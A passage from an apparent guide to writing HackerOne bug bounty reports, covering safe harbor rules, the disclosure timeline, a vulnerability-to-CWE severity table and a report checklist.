2. Good faith testing
3. Prompt vulnerability reporting
4. No data exfiltration
5. No system damage

### Disclosure Timeline

Follow HackerOne's disclosure timeline:
1. Report vulnerability to program
2. Allow reasonable remediation time
3. Coordinate disclosure with program
4. Follow platform disclosure rules (default 90 days)

## Cheat Sheet

### Quick Reference for HackerOne

1. **Taxonomy**: Always identify the correct category and CWE
2. **CVSS**: Use calculator, justify each metric
3. **Evidence**: Include screenshots and request/response pairs
4. **Reproduction**: Step-by-step instructions that work
5. **Impact**: Quantified with business context
6. **Remediation**: Specific code-level fixes
7. **Format**: Follow HackerOne report structure
8. **Triage**: Respond promptly to questions
9. **Improvement**: Learn from every outcome
10. **Compliance**: Follow program rules and safe harbor

### HackerOne Taxonomy Quick Reference

| Vulnerability | Taxonomy | CWE | Default Severity |
|---------------|----------|-----|------------------|
| SQL Injection | SQL Injection | CWE-89 | Critical |
| Stored XSS | Cross-Site Scripting (XSS) | CWE-79 | High |
| IDOR | Insecure Direct Object Reference (IDOR) | CWE-639 | High |
| CSRF | Cross-Site Request Forgery (CSRF) | CWE-352 | Medium |
| SSRF | Server-Side Request Forgery (SSRF) | CWE-918 | High |
| XXE | XML External Entity (XXE) | CWE-611 | High |
| Command Injection | Command Injection | CWE-78 | Critical |
| Authentication Bypass | Authentication Bypass | CWE-287 | Critical |

### Report Checklist

- [ ] Vulnerability type correctly identified
- [ ] CWE classification included
- [ ] CVSS score calculated and justified
- [ ] Clear vulnerability description
- [ ] Quantified impact assessment
- [ ] Complete reproduction steps
- [ ] All evidence included (screenshots, HTTP traffic)
- [ ] Specific remediation guidance
- [ ] Professional tone throughout
- [ ] Program scope verified
- [ ] No duplicate reports exist
- [ ] Formatting compliant with HackerOne standards
